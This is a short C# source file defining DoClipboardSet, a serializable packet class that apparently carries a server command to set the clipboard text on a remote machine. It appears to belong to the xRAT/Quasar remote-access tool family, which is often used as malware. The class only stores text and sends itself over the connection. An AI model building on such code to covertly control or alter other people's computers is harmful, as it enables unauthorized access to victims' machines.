using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoClipboardSet : IPacket
{
	public string Text { get; set; }

	public DoClipboardSet()
	{
	}

	public DoClipboardSet(string Text)
	{
		this.Text = Text;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
